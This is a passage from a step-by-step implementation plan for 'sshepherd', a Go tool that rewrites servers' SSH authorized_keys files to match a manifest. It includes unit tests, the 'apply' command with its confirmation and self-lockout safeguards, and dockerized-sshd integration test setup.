func TestRenderSummaryFailedAndSymlink(t *testing.T) {
	plans := []ServerPlan{
		{Server: config.Server{Name: "a"}, Class: ClassChange, Outcome: OutcomeFailed,
			OutcomeErr: errors.New("verify on a: file bytes differ from the rendered desired state")},
		{Server: config.Server{Name: "b"}, Class: ClassChange, Outcome: OutcomeRefused,
			OutcomeErr: errors.New("/etc/keys is a symlink — refusing to replace it with a regular file (point authorized_keys_file at the real target if intended)")},
	}
	var buf bytes.Buffer
	RenderSummary(&buf, plans, RenderOptions{})
	out := buf.String()
	for _, want := range []string{
		"a: FAILED: verify on a",
		"b: REFUSED: /etc/keys is a symlink",
		"Summary: 0/2 servers converged · 1 failed · 1 refused  → exit 1",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("summary lacks %q:\n%s", want, out)
		}
	}
}

func TestRenderAllConvergedSummary(t *testing.T) {
	plans := []ServerPlan{{Server: config.Server{Name: "a"}, Class: ClassConverged}}
	var buf bytes.Buffer
	RenderSummary(&buf, plans, RenderOptions{})
	if got, want := buf.String(), "Summary: 1/1 servers converged  → exit 0\n"; got != want {
		t.Errorf("summary = %q, want %q", got, want)
	}
}

func TestRenderEmptyPlans(t *testing.T) {
	var buf bytes.Buffer
	Render(&buf, mixedCfg(t), nil, RenderOptions{})
	if got, want := buf.String(), "Summary: 0 servers targeted — nothing to apply\n"; got != want {
		t.Errorf("empty render = %q, want %q", got, want)
	}
	buf.Reset()
	RenderSummary(&buf, nil, RenderOptions{})
	if buf.Len() != 0 {
		t.Errorf("RenderSummary(nil) = %q, want no output", buf.String())
	}
}

func TestRenderGuardNoteAndWarning(t *testing.T) {
	plans := []ServerPlan{{
		Server: config.Server{Name: "w", User: "u", Host: "h", Port: 22},
		Class:  ClassChange, Outcome: OutcomePending,
		Note:    "removes the key this session logged in with; op remains",
		Warning: "every remaining agent-held key carries a restrictive option (from=/command=/restrict/expiry-time=) — future sshepherd logins may be functionally blocked",
	}}
	var buf bytes.Buffer
	Render(&buf, mixedCfg(t), plans, RenderOptions{})
	if !strings.Contains(buf.String(), "note: removes the key this session logged in with") {
		t.Errorf("report lacks the rotate note:\n%s", buf.String())
	}
	if !strings.Contains(buf.String(), "warning: every remaining agent-held key") {
		t.Errorf("report lacks the restrictive-options warning:\n%s", buf.String())
	}
}
```

Create `internal/apply/leak_test.go` per the convention block.

- [ ] **Step 7.7: Run tests to verify they fail, then compile-fix and generate goldens**

Run: `go test ./internal/apply/ -v`
Expected: on the first run before Step 7.1–7.3 files exist, everything fails to compile; once implementation files are in, expected FAILs are only the missing goldens.

Run: `mkdir -p internal/apply/testdata && go test ./internal/apply/ -update && go test ./internal/apply/ -v`
Expected: PASS. Inspect the four new goldens: `plan_mixed.golden` must read like the spec's example (glyph rows, tabwriter-aligned columns, `→` tail line, one-liners for converged/refused/unreachable); `summary_applied.golden` must end `→ exit 1`.

- [ ] **Step 7.8: Gate**

Run the gate (four commands). Expected: clean.

- [ ] **Step 7.9: Commit**

```bash
git add internal/apply/
git commit -m "$(cat <<'EOF'
feat(apply): plan computation, guard, and report (pure core)

Per-server classification (byte-exact convergence, add/remove/rewrite/
normalize rows, empty-desired converged-vs-refused split, unparseable
refusal), the self-lockout guard (intersection over agent-held keys, rotate
note, restrictive-options warning, empty-listing fallback), phase-2
orchestration behind a Writer seam with a defensive guard re-check, and the
plan/outcome report with goldens.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 8: `feat(cmd)` — `sshepherd apply`: plan, confirm, write, verify

The command wires it together: audit-identical preflights plus the agent-fingerprint capture, phase 1 through `audit.Run` with the `--server` subset, `apply.Build` + `apply.Render`, the confirmation gate (TTY on stdin **and** stderr, prompt on stderr so `apply > plan.txt` captures exactly the report, `--yes` for automation, `--dry-run` mutually exclusive), phase 2 through `sshwrite.FleetWriter`, outcome + summary, and exit mapping reusing `errNonCompliant`.

**Files:**
- Create: `cmd/sshepherd/apply.go`
- Modify: `cmd/sshepherd/run.go` (register the command)
- Test: `cmd/sshepherd/apply_test.go`

- [ ] **Step 8.1: Write the failing tests**

Create `cmd/sshepherd/apply_test.go`:

```go
package main

import (
	"bytes"
	"strings"
	"testing"

	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/testkeys"
)

// applyFleetYAML: one user granted one server (host/port injected).
func applyFleetYAML(t *testing.T, hostPort string) string {
	t.Helper()
	return `
users:
  - {name: alice, keys: ["` + testkeys.Line(t, 1) + `"]}
servers:
  - {name: web-1, ` + hostPort + `, user: deploy}
access:
  - {user: alice, servers: [web-1]}
`
}

func TestApplyMissingConfig(t *testing.T) {
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", "no-such-file.yaml"}, &out, &errBuf); code != 3 {
		t.Fatalf("exit = %d, want 3 (stderr: %s)", code, errBuf.String())
	}
}

func TestApplyInvalidParallel(t *testing.T) {
	path := writeConfig(t, "")
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path, "--parallel", "0"}, &out, &errBuf); code != 3 {
		t.Fatalf("exit = %d, want 3", code)
	}
}

func TestApplyDryRunYesConflict(t *testing.T) {
	path := writeConfig(t, "")
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path, "--dry-run", "--yes"}, &out, &errBuf); code != 3 {
		t.Fatalf("exit = %d, want 3 (mutually exclusive flags)", code)
	}
}

func TestApplyUnknownServer(t *testing.T) {
	// Checked before any preflight: a canary typo must fail fast, not
	// silently apply nothing — and must not require an agent.
	t.Setenv("SSH_AUTH_SOCK", "")
	path := writeConfig(t, applyFleetYAML(t, "host: 10.0.0.1"))
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path, "--server", "nope"}, &out, &errBuf); code != 3 {
		t.Fatalf("exit = %d, want 3 (stderr: %s)", code, errBuf.String())
	}
	if !strings.Contains(errBuf.String(), `unknown server "nope"`) {
		t.Errorf("stderr = %q, want the unknown-server error", errBuf.String())
	}
}

func TestApplyNoAgent(t *testing.T) {
	t.Setenv("SSH_AUTH_SOCK", "")
	path := writeConfig(t, applyFleetYAML(t, "host: 10.0.0.1"))
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path}, &out, &errBuf); code != 3 {
		t.Fatalf("exit = %d, want 3", code)
	}
	if !strings.Contains(errBuf.String(), "SSH_AUTH_SOCK") {
		t.Errorf("stderr = %q, want agent guidance", errBuf.String())
	}
}

func TestApplyEmptyFleet(t *testing.T) {
	t.Setenv("SSH_AUTH_SOCK", "")
	path := writeConfig(t, `
users:
  - {name: alice, keys: ["`+testkeys.Line(t, 1)+`"]}
`)
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path}, &out, &errBuf); code != 0 {
		t.Fatalf("exit = %d, want 0 (stderr: %s)", code, errBuf.String())
	}
	if !strings.Contains(out.String(), "0 servers targeted — nothing to apply") {
		t.Errorf("stdout = %q, want the empty summary", out.String())
	}
}

func TestApplyLogsManifestWarnings(t *testing.T) {
	t.Setenv("SSH_AUTH_SOCK", "")
	path := writeConfig(t, `
users:
  - name: alice
    comment: "alice — platform team"
    keys: ["`+testkeys.Line(t, 1)+`", "`+testkeys.Line(t, 2)+`"]
`)
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path}, &out, &errBuf); code != 0 {
		t.Fatalf("exit = %d, want 0 (stderr: %s)", code, errBuf.String())
	}
	if !strings.Contains(errBuf.String(), "comment is set on a user with 2 keys") {
		t.Errorf("stderr = %q, want the multi-key comment warning", errBuf.String())
	}
}

// TestApplyDryRunUnreachable drives the full run() path against a fleet
// whose one server refuses connections: plan renders the ERROR head, the
// summary counts it, exit is 1, and nothing prompted.
func TestApplyDryRunUnreachable(t *testing.T) {
	path, kh := unreachableFleet(t) // fake agent + closed port, from adopt_test.go
	var out, errBuf bytes.Buffer
	code := run([]string{"apply", "--config", path, "--known-hosts", kh, "--dry-run"}, &out, &errBuf)
	if code != 1 {
		t.Fatalf("exit = %d, want 1 (stderr: %s)", code, errBuf.String())
	}
	if !strings.Contains(out.String(), "ERROR:") {
		t.Errorf("stdout = %q, want the unreachable head", out.String())
	}
	if !strings.Contains(out.String(), "1 unreachable  → exit 1") {
		t.Errorf("stdout = %q, want the summary counting the unreachable server", out.String())
	}
}

// Without --dry-run the behavior is identical when no server needs a write:
// nothing to confirm, so no prompt and no TTY requirement.
func TestApplyUnreachableNoPromptNeeded(t *testing.T) {
	path, kh := unreachableFleet(t)
	var out, errBuf bytes.Buffer
	if code := run([]string{"apply", "--config", path, "--known-hosts", kh}, &out, &errBuf); code != 1 {
		t.Fatalf("exit = %d, want 1 (stderr: %s)", code, errBuf.String())
	}
	if strings.Contains(errBuf.String(), "[y/N]") {
		t.Errorf("stderr = %q, must not prompt when nothing needs a write", errBuf.String())
	}
}

func TestApplyServerFilterSkippedNote(t *testing.T) {
	fakeAgent(t)
	kh := writeEmptyKnownHosts(t)
	path := writeConfig(t, `
users:
  - {name: alice, keys: ["`+testkeys.Line(t, 1)+`"]}
servers:
  - {name: web-1, host: 127.0.0.1, port: `+strconvItoa(closedPort(t))+`, user: deploy}
  - {name: web-2, host: 127.0.0.1, port: `+strconvItoa(closedPort(t))+`, user: deploy}
access:
  - {user: alice, servers: [web-1, web-2]}
`)
	var out, errBuf bytes.Buffer
	code := run([]string{"apply", "--config", path, "--known-hosts", kh, "--dry-run", "--server", "web-1"}, &out, &errBuf)
	if code != 1 {
		t.Fatalf("exit = %d, want 1 (stderr: %s)", code, errBuf.String())
	}
	if !strings.Contains(out.String(), "(1 servers skipped by --server)") {
		t.Errorf("stdout = %q, want the skipped-by-server note", out.String())
	}
	if strings.Contains(out.String(), "web-2") {
		t.Errorf("stdout = %q, must not mention the skipped server", out.String())
	}
	if !strings.Contains(out.String(), "0/1 servers converged") {
		t.Errorf("stdout = %q, counts must be over the 1 targeted server only", out.String())
	}
}

func TestConfirm(t *testing.T) {
	tests := []struct {
		name    string
		in      string
		tty     bool
		yes     bool
		wantOK  bool
		wantErr bool
	}{
		{"--yes bypasses the prompt", "", false, true, true, false},
		{"non-TTY without --yes errors", "", false, false, false, true},
		{"tty y", "y\n", true, false, true, false},
		{"tty Y", "Y\n", true, false, true, false},
		{"tty yes", "yes\n", true, false, true, false},
		{"tty n", "n\n", true, false, false, false},
		{"tty empty defaults to no", "\n", true, false, false, false},
		{"tty EOF declines", "", true, false, false, false},
		{"tty garbage declines", "sure why not\n", true, false, false, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var errBuf bytes.Buffer
			ok, err := confirm(strings.NewReader(tt.in), &errBuf, tt.tty, tt.yes, 3, 12)
			if ok != tt.wantOK || (err != nil) != tt.wantErr {
				t.Fatalf("confirm = (%v, %v), want (%v, err=%v)", ok, err, tt.wantOK, tt.wantErr)
			}
			if tt.tty && !tt.yes {
				if !strings.Contains(errBuf.String(), "apply 3 of 12 servers? [y/N]") {
					t.Errorf("prompt = %q, want the exact question on stderr", errBuf.String())
				}
			} else if errBuf.Len() != 0 {
				t.Errorf("wrote %q to stderr without a TTY prompt", errBuf.String())
			}
		})
	}
}

func TestStdioIsTTYOnBuffers(t *testing.T) {
	if stdioIsTTY(strings.NewReader(""), &bytes.Buffer{}) {
		t.Error("buffers must never count as a TTY")
	}
}

func TestSelectServers(t *testing.T) {
	y := `
users:
  - {name: alice, keys: ["` + testkeys.Line(t, 1) + `"]}
servers:
  - {name: a, host: h1, user: u}
  - {name: b, host: h2, user: u}
  - {name: c, host: h3, user: u}
access:
  - {user: alice, servers: [a, b, c]}
`
	cfg, err := config.Parse([]byte(y))
	if err != nil {
		t.Fatalf("config: %v", err)
	}
	t.Run("no names selects the fleet", func(t *testing.T) {
		got, err := selectServers(cfg, nil)
		if err != nil || len(got) != 3 {
			t.Fatalf("got %d servers, err %v; want 3", len(got), err)
		}
	})
	t.Run("subset keeps manifest order and dedupes", func(t *testing.T) {
		got, err := selectServers(cfg, []string{"c", "a", "c"})
		if err != nil {
			t.Fatalf("selectServers: %v", err)
		}
		if len(got) != 2 || got[0].Name != "a" || got[1].Name != "c" {
			t.Fatalf("got %v, want [a c] in manifest order", got)
		}
	})
	t.Run("unknown name errors", func(t *testing.T) {
		if _, err := selectServers(cfg, []string{"a", "nope"}); err == nil || !strings.Contains(err.Error(), `unknown server "nope"`) {
			t.Fatalf("err = %v, want the unknown-server error", err)
		}
	})
}
```

Also add these two small helpers to `cmd/sshepherd/apply_test.go` (used above):

```go
// writeEmptyKnownHosts creates an empty known_hosts for closed-port fleets.
func writeEmptyKnownHosts(t *testing.T) string {
	t.Helper()
	kh := filepath.Join(t.TempDir(), "known_hosts")
	if err := os.WriteFile(kh, nil, 0o600); err != nil {
		t.Fatalf("write known_hosts: %v", err)
	}
	return kh
}

func strconvItoa(n int) string { return strconv.Itoa(n) }
```

(and extend the file's import block with `os`, `path/filepath`, `strconv`).

- [ ] **Step 8.2: Run tests to verify they fail**

Run: `go test ./cmd/sshepherd/ -run 'TestApply|TestConfirm|TestStdio|TestSelectServers' -v`
Expected: FAIL — `unknown command "apply"` for the run() tests; `undefined: confirm`, `undefined: stdioIsTTY`, `undefined: selectServers` for the unit tests.

- [ ] **Step 8.3: Implement `cmd/sshepherd/apply.go`**

```go
package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"
	"golang.org/x/term"

	"github.com/javadh75/SSHepherd/internal/apply"
	"github.com/javadh75/SSHepherd/internal/audit"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn"
	"github.com/javadh75/SSHepherd/internal/sshread"
	"github.com/javadh75/SSHepherd/internal/sshwrite"
)

func newApplyCmd(a *app, stdout io.Writer) *cobra.Command {
	var (
		cfgPath    string
		knownHosts string
		parallel   int
		serverSel  []string
		dryRun     bool
		yes        bool
	)
	cmd := &cobra.Command{
		Use:   "apply",
		Short: "Make each server's authorized_keys match the manifest (writes to the fleet)",
		Long: "Makes each targeted server's authorized_keys equal the manifest's rendered\n" +
			"desired state — a FULL-FILE rewrite (managed header, operator keys first,\n" +
			"decided comment policy). Non-key lines (hand-written comments, blank lines)\n" +
			"are DELETED by the rewrite; the plan shows a normalize row with the count\n" +
			"before anything is written. Flow: read the whole fleet, show one plan,\n" +
			"confirm once (interactive prompt, or --yes), then write only drifted\n" +
			"servers — atomically (temp file + rename), with a .sshepherd.bak backup\n" +
			"and a read-back verify. A self-lockout guard refuses any write that would\n" +
			"remove every agent-held key from a server. --dry-run previews the plan\n" +
			"and never writes.",
		Args: cobra.NoArgs,
		RunE: func(cmd *cobra.Command, _ []string) error {
			if parallel < 1 {
				return fmt.Errorf("--parallel must be >= 1 (got %d)", parallel)
			}
			log := a.logger
			cfg, err := config.Load(cfgPath)
			if err != nil {
				return fmt.Errorf("load manifest: %w", err) // wrapcheck: wrap at package boundary
			}
			log.Info(fmt.Sprintf("loaded manifest: %d users, %d servers", len(cfg.Users), len(cfg.Servers)))
			for _, w := range cfg.Warnings {
				log.Warn(w)
			}
			targets, err := selectServers(cfg, serverSel)
			if err != nil {
				return err
			}
			skipped := len(cfg.Servers) - len(targets)
			ropts := apply.RenderOptions{Color: a.reportColor}
			if len(targets) == 0 {
				apply.Render(stdout, cfg, nil, ropts)
				return nil
			}

			// Preflights: audit's, plus the guard's fingerprint capture.
			if err := sshread.CheckAgent(cmd.Context(), os.Getenv("SSH_AUTH_SOCK")); err != nil {
				return fmt.Errorf("agent preflight: %w", err)
			}
			agentFPs, err := sshconn.AgentFingerprints(cmd.Context(), os.Getenv("SSH_AUTH_SOCK"))
			if err != nil {
				return fmt.Errorf("agent preflight: %w", err)
			}
			khPath, err := expandHome(knownHosts)
			if err != nil {
				return err
			}
			if err := sshread.PreflightKnownHosts(khPath); err != nil {
				return fmt.Errorf("known_hosts preflight: %w", err)
			}

			// Phase 1: read + plan (audit's pipeline over the targeted subset).
			reader := &sshread.Client{
				KnownHostsPath: khPath,
				AgentSock:      os.Getenv("SSH_AUTH_SOCK"),
				DialTimeout:    dialTimeout,
				Log:            log,
			}
			log.Info(fmt.Sprintf("planning %d servers (parallelism %d)…", len(targets), parallel))
			start := time.Now()
			results := audit.Run(cmd.Context(), cfg, reader, audit.Options{
				Parallel:         parallel,
				PerServerTimeout: perServerTimeout,
				Servers:          targets,
				Logger:           log,
			})
			logFleetReadDone(log, cfg, results, start)
			plans, err := apply.Build(cfg, results, agentFPs)
			if err != nil {
				return err
			}
			apply.Render(stdout, cfg, plans, ropts)

			finish := func() error {
				apply.RenderSummary(stdout, plans, ropts)
				if skipped > 0 {
					fmt.Fprintf(stdout, "(%d servers skipped by --server)\n", skipped)
				}
				if apply.ExitCode(plans) != 0 {
					return errNonCompliant
				}
				return nil
			}

			toApply := 0
			for _, p := range plans {
				if p.Class == apply.ClassChange {
					toApply++
				}
			}
			if toApply == 0 || dryRun {
				// Nothing to confirm (or a preview): report + summary only.
				return finish()
			}

			// Confirmation gate: prompt on stderr, answer from stdin, so
			// `apply > plan.txt` captures exactly the report.
			in := cmd.InOrStdin()
			errW := cmd.ErrOrStderr()
			ok, err := confirm(in, errW, stdioIsTTY(in, errW), yes, toApply, len(plans))
			if err != nil {
				return err
			}
			if !ok {
				log.Error("aborted; no changes made")
				return finish() // pending changes → exit 1
			}

			// Phase 2: write drifted servers only.
			writer := &sshwrite.FleetWriter{
				Dialer: &sshconn.Dialer{
					KnownHostsPath: khPath,
					AgentSock:      os.Getenv("SSH_AUTH_SOCK"),
					DialTimeout:    dialTimeout,
					Log:            log,
				},
				Log: log,
			}
			log.Info(fmt.Sprintf("applying %d servers (parallelism %d)…", toApply, parallel))
			apply.Execute(cmd.Context(), plans, writer, apply.ExecOptions{
				Parallel:         parallel,
				PerServerTimeout: perServerTimeout,
				AgentFPs:         agentFPs,
				Logger:           log,
			})
			return finish()
		},
	}
	cmd.Flags().StringVar(&cfgPath, "config", "sshepherd.yaml", "path to the manifest")
	cmd.Flags().StringVar(&knownHosts, "known-hosts", defaultKnownHosts, "path to known_hosts (strict host-key checking)")
	cmd.Flags().IntVar(&parallel, "parallel", defaultParallel, "max concurrent server connections")
	cmd.Flags().StringArrayVar(&serverSel, "server", nil, "restrict the run to this server (repeatable; canary rollout)")
	cmd.Flags().BoolVar(&dryRun, "dry-run", false, "plan and report only; never write")
	cmd.Flags().BoolVar(&yes, "yes", false, "skip the confirmation prompt (automation)")
	cmd.MarkFlagsMutuallyExclusive("dry-run", "yes")
	return cmd
}

// selectServers resolves --server names to manifest servers, preserving
// manifest order and deduplicating; no names selects the whole fleet. An
// unknown name is a usage error — a canary typo must not silently apply
// nothing.
func selectServers(cfg *config.Config, names []string) ([]config.Server, error) {
	if len(names) == 0 {
		return cfg.Servers, nil
	}
	known := make(map[string]bool, len(cfg.Servers))
	for _, s := range cfg.Servers {
		known[s.Name] = true
	}
	wanted := make(map[string]bool, len(names))
	for _, n := range names {
		if !known[n] {
			return nil, fmt.Errorf("--server: unknown server %q", n)
		}
		wanted[n] = true
	}
	var targets []config.Server
	for _, s := range cfg.Servers {
		if wanted[s.Name] {
			targets = append(targets, s)
		}
	}
	return targets, nil
}

// confirm gates phase 2. --yes short-circuits; otherwise a TTY prompts once
// on stderr, defaulting to no; non-TTY without --yes is a usage error —
// automation must opt in explicitly, never by accident of a pipe.
func confirm(in io.Reader, errW io.Writer, tty, yes bool, n, total int) (bool, error) {
	if yes {
		return true, nil
	}
	if !tty {
		return false, errors.New("confirmation required: re-run with --yes (or --dry-run to preview) — stdin/stderr is not a terminal")
	}
	fmt.Fprintf(errW, "apply %d of %d servers? [y/N] ", n, total)
	sc := bufio.NewScanner(in)
	if !sc.Scan() {
		return false, nil // EOF (Ctrl-D) declines
	}
	switch strings.ToLower(strings.TrimSpace(sc.Text())) {
	case "y", "yes":
		return true, nil
	}
	return false, nil
}

// stdioIsTTY reports whether both in and errW are terminals — the prompt
// contract needs both: stdin to read the answer, stderr to show the
// question even when stdout is redirected.
func stdioIsTTY(in io.Reader, errW io.Writer) bool {
	fi, ok := in.(*os.File)
	if !ok || !term.IsTerminal(int(fi.Fd())) {
		return false
	}
	fe, ok := errW.(*os.File)
	return ok && term.IsTerminal(int(fe.Fd()))
}
```

- [ ] **Step 8.4: Register the command**

In `cmd/sshepherd/run.go` `newRootCmd`, after `root.AddCommand(newAdoptCmd(a, stdout))`:

```go
	root.AddCommand(newApplyCmd(a, stdout))
```

- [ ] **Step 8.5: Run the package tests**

Run: `go test ./cmd/sshepherd/ -v`
Expected: PASS — the new apply tests and every pre-existing cmd test.

- [ ] **Step 8.6: Full gate**

Run: `make check`
Expected: all green — deadcode is satisfied again: every new exported identifier (`authkeys.Render`, `sshconn.AgentFingerprints`, `sshwrite.FleetWriter`, package `apply`) is now reachable from `main`.

- [ ] **Step 8.7: Commit**

```bash
git add cmd/sshepherd/apply.go cmd/sshepherd/apply_test.go cmd/sshepherd/run.go
git commit -m "$(cat <<'EOF'
feat(cmd): sshepherd apply — plan, confirm, write, verify

Audit-identical preflights plus agent fingerprint capture, --server canary
filtering with a skipped-note, plan report, TTY-gated confirmation on
stderr (--yes / --dry-run, mutually exclusive), phase-2 fan-out through
sshwrite, and monitoring-style exits 0/1/3 reusing errNonCompliant.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 9: `test(integration)` — apply against dockerized sshd + E2E loop

Real writes happen **only** here, against the throwaway container `scripts/integration.sh` builds — no test path ever touches a non-fixture host. The script grows four users with disjoint roles so the three test packages can run in parallel without trampling each other: `writer` (sshwrite's drift/backup/verify), `virgin` (file-absent creation; logs in via `authorized_keys2` like the existing `absent` user), `sym` (symlinked target refusal), `e2e` (the cmd-level full loop). The existing `present`/`absent` read fixtures are untouched.

Read `internal/sshread/integration_test.go` first — the new tests follow its exact conventions: `//go:build integration` tag, env-driven skip, 30s ctx timeouts.

**Files:**
- Modify: `scripts/integration.sh`
- Create: `internal/sshwrite/integration_test.go`
- Create: `cmd/sshepherd/e2e_test.go`

- [ ] **Step 9.1: Extend `scripts/integration.sh`**

(a) After the existing `ssh-keygen` + `chmod 644` pair, generate the stale key (never added to the agent — it exists to be discovered and removed):

```bash
ssh-keygen -q -t ed25519 -N '' -f "$WORKDIR/stale"
chmod 644 "$WORKDIR/stale.pub"
```

(b) Add a second volume mount to the `docker run` flags, next to the existing one:

```bash
  -v "$WORKDIR/stale.pub:/seed/stale.pub:ro" \
```

(c) Inside the container script, after the existing `present`/`absent` seeding block (the second `chmod 600` loop) and **before** the `grep -q "^AuthorizedKeysFile"` check, add:

```sh
    for u in writer virgin sym e2e; do
      adduser -D -s /bin/sh "$u"
      sed -i "s|^$u:!|$u:*|" /etc/shadow   # unlock for pubkey login
      mkdir -p "/home/$u/.ssh"
    done
    # writer + e2e: drifted seed (agent key + a stale key apply must remove).
    cat /seed/key.pub /seed/stale.pub > /home/writer/.ssh/authorized_keys
    cat /seed/key.pub /seed/stale.pub > /home/e2e/.ssh/authorized_keys
    # virgin: logs in via authorized_keys2; the default file stays absent
    # until apply creates it (first-contact case).
    cp /seed/key.pub /home/virgin/.ssh/authorized_keys2
    # sym: authorized_keys is a symlink — apply must refuse, sshd still reads
    # through it for login.
    cp /seed/key.pub /home/sym/.ssh/authorized_keys_real
    ln -s authorized_keys_real /home/sym/.ssh/authorized_keys
    for u in writer virgin sym e2e; do
      chown -R "$u:$u" "/home/$u/.ssh"
      chmod 700 "/home/$u/.ssh"
      chmod 600 "/home/$u/.ssh/"authorized_keys* 2>/dev/null || true
    done
```

(d) Replace the final `go test` invocation with:

```bash
SSHEPHERD_IT_HOST=127.0.0.1 \
SSHEPHERD_IT_PORT="$PORT" \
SSHEPHERD_IT_KNOWN_HOSTS="$WORKDIR/known_hosts" \
SSHEPHERD_IT_PUB="$WORKDIR/id_ed25519.pub" \
  go test -race -tags=integration -run 'TestIntegration|TestE2E' -v \
  ./internal/sshread/ ./internal/sshwrite/ ./cmd/sshepherd/
```

(The three packages may run in parallel; their fixture users are disjoint by design.)

- [ ] **Step 9.2: Create `internal/sshwrite/integration_test.go`**

```go
//go:build integration

package sshwrite

import (
	"bytes"
	"context"
	"errors"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/javadh75/SSHepherd/internal/authkeys"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn"
)

// itDialer builds a Dialer from the environment exported by
// scripts/integration.sh; skips when not running under it.
func itDialer(t *testing.T) (*sshconn.Dialer, string, int) {
	t.Helper()
	host := os.Getenv("SSHEPHERD_IT_HOST")
	if host == "" {
		t.Skip("integration env not set; run via make integration")
	}
	port, err := strconv.Atoi(os.Getenv("SSHEPHERD_IT_PORT"))
	if err != nil {
		t.Fatalf("SSHEPHERD_IT_PORT: %v", err)
	}
	return &sshconn.Dialer{
		KnownHostsPath: os.Getenv("SSHEPHERD_IT_KNOWN_HOSTS"),
		AgentSock:      os.Getenv("SSH_AUTH_SOCK"),
		DialTimeout:    10 * time.Second,
	}, host, port
}

func itWriter(t *testing.T) (*FleetWriter, string, int) {
	t.Helper()
	d, host, port := itDialer(t)
	return &FleetWriter{Dialer: d}, host, port
}

func itCtx(t *testing.T) context.Context {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	t.Cleanup(cancel)
	return ctx
}

// remoteOut runs cmd as srv's user and returns stdout, failing on transport
// errors or a nonzero exit — the assertion channel for on-server state.
func remoteOut(t *testing.T, d *sshconn.Dialer, srv config.Server, cmd string) string {
	t.Helper()
	conn, err := d.Connect(itCtx(t), srv)
	if err != nil {
		t.Fatalf("connect %s: %v", srv.User, err)
	}
	defer func() { _ = conn.Close() }()
	code, stdout, stderr, err := sshconn.Exec(conn.Client, cmd, nil)
	if err != nil {
		t.Fatalf("exec %q: %v", cmd, err)
	}
	if code != 0 {
		t.Fatalf("exec %q: exit %d (stderr %q)", cmd, code, stderr.String())
	}
	return stdout.String()
}

// itRendered builds a realistic managed-file payload from the agent's key.
func itRendered(t *testing.T) []byte {
	t.Helper()
	pub, err := os.ReadFile(os.Getenv("SSHEPHERD_IT_PUB"))
	if err != nil {
		t.Fatalf("SSHEPHERD_IT_PUB: %v", err)
	}
	return []byte(authkeys.ManagedHeader + "\n" + strings.TrimSpace(string(pub)) + "\n")
}

// TestIntegrationApplyWriteBackupVerify covers the drifted-seed protocol on
// one user in one ordered flow: write → byte-equal → 0600 → backup holds the
// pre-apply bytes → no temp residue → idempotent re-apply rolls the backup.
func TestIntegrationApplyWriteBackupVerify(t *testing.T) {
	w, host, port := itWriter(t)
	srv := config.Server{Name: "writer", Host: host, Port: port, User: "writer"}
	rendered := itRendered(t)

	orig := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys"`)
	if !strings.Contains(orig, "ssh-ed25519") || len(strings.Split(strings.TrimSpace(orig), "\n")) != 2 {
		t.Fatalf("pre-apply seed = %q, want the seeded 2-key drift", orig)
	}

	if err := w.Apply(itCtx(t), srv, rendered); err != nil {
		t.Fatalf("Apply: %v", err)
	}

	if got := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys"`); got != string(rendered) {
		t.Errorf("file = %q, want byte-equal to the render", got)
	}
	if mode := strings.TrimSpace(remoteOut(t, w.Dialer, srv, `stat -c %a "$HOME/.ssh/authorized_keys"`)); mode != "600" {
		t.Errorf("mode = %s, want 600", mode)
	}
	if bak := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys.sshepherd.bak"`); bak != orig {
		t.Errorf("backup = %q, want the pre-apply bytes %q", bak, orig)
	}
	if ls := remoteOut(t, w.Dialer, srv, `ls "$HOME/.ssh"`); strings.Contains(ls, ".sshepherd.tmp") {
		t.Errorf("temp residue in ~/.ssh: %q", ls)
	}

	// Re-apply the identical render: succeeds, and the single-generation
	// backup now holds the (identical) previous state.
	if err := w.Apply(itCtx(t), srv, rendered); err != nil {
		t.Fatalf("re-Apply: %v", err)
	}
	if bak := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys.sshepherd.bak"`); bak != string(rendered) {
		t.Errorf("backup after re-apply = %q, want the rolled generation", bak)
	}
}

// TestIntegrationApplyFileAbsent: user virgin logs in via authorized_keys2,
// so the default file genuinely does not exist — apply creates it (0600)
// without touching how the user logs in.
func TestIntegrationApplyFileAbsent(t *testing.T) {
	w, host, port := itWriter(t)
	srv := config.Server{Name: "virgin", Host: host, Port: port, User: "virgin"}
	rendered := itRendered(t)

	if err := w.Apply(itCtx(t), srv, rendered); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if got := remoteOut(t, w.Dialer, srv, `cat "$HOME/.ssh/authorized_keys"`); got != string(rendered) {
		t.Errorf("created file = %q, want the render", got)
	}
	if mode := strings.TrimSpace(remoteOut(t, w.Dialer, srv, `stat -c %a "$HOME/.ssh/authorized_keys"`)); mode != "600" {
		t.Errorf("mode = %s, want 600", mode)
	}
	// No backup: there was nothing to back up.
	if out := remoteOut(t, w.Dialer, srv, `ls "$HOME/.ssh"`); strings.Contains(out, "authorized_keys.sshepherd.bak") {
		t.Errorf("ls = %q, want no backup for a previously absent file", out)
	}
}

// TestIntegrationApplyCreatesOverrideDir: an authorized_keys_file override
// under a directory that does not exist yet — mkdir -p under umask 077 must
// yield 0700/0600.
func TestIntegrationApplyCreatesOverrideDir(t *testing.T) {
	w, host, port := itWriter(t)
	srv := config.Server{
		Name: "virgin", Host: host, Port: port, User: "virgin",
		AuthorizedKeysFile: "~/keys.d/authorized_keys",
	}
	rendered := itRendered(t)

